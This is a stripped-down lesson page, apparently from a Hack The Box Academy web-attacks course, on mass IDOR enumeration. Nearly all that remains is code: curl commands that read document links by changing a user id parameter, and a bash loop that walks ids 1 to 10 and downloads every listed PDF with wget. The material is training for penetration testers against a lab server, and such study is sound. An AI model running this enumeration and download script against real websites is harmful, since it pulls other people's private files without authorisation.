<!--
 // Platform: Academy
// URL: https://academy.hackthebox.com/module/134/section/1186
// Platform Version: V1
// Module ID: 134
// Module Name: Web Attacks
// Module Difficulty: Medium
// Section ID: 1186
// Section Title: Mass IDOR Enumeration
// Page Title: Hack The Box - Academy
// Page Number: 8
-->

# Mass IDOR Enumeration

**Module Name:** Web Attacks **Page Number:** 8

#### 

#### WEB ATTACKS

# Mass IDOR Enumeration

## Insecure Parameters

![https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_employee_manager.jpg](https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_employee_manager.jpg)

![https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_documents.jpg](https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_documents.jpg)

``` html
/documents/Invoice_1_09_2021.pdf
/documents/Report_1_10_2021.pdf
```

![https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_documents.jpg](https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_documents.jpg)

``` html
/documents/Invoice_2_08_2020.pdf
/documents/Report_2_12_2020.pdf
```

## Mass Enumeration

``` html
<li class='pure-tree_link'><a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>Invoice</a></li>
<li class='pure-tree_link'><a href='/documents/Report_3_01_2020.pdf' target='_blank'>Report</a></li>
```

``` shell-session
[!bash!]$ curl -s "http://SERVER_IP:PORT/documents.php?uid=1" | grep "<li class='pure-tree_link'>"

<li class='pure-tree_link'><a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>Invoice</a></li>
<li class='pure-tree_link'><a href='/documents/Report_3_01_2020.pdf' target='_blank'>Report</a></li>
```

``` shell-session
[!bash!]$ curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep -oP "\/documents.*?.pdf"

/documents/Invoice_3_06_2020.pdf
/documents/Report_3_01_2020.pdf
```

``` bash
#!/bin/bash

url="http://SERVER_IP:PORT"

for i in {1..10}; do
        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
                wget -q $url/$link
        done
done
```

# 

# 

#### Questions

####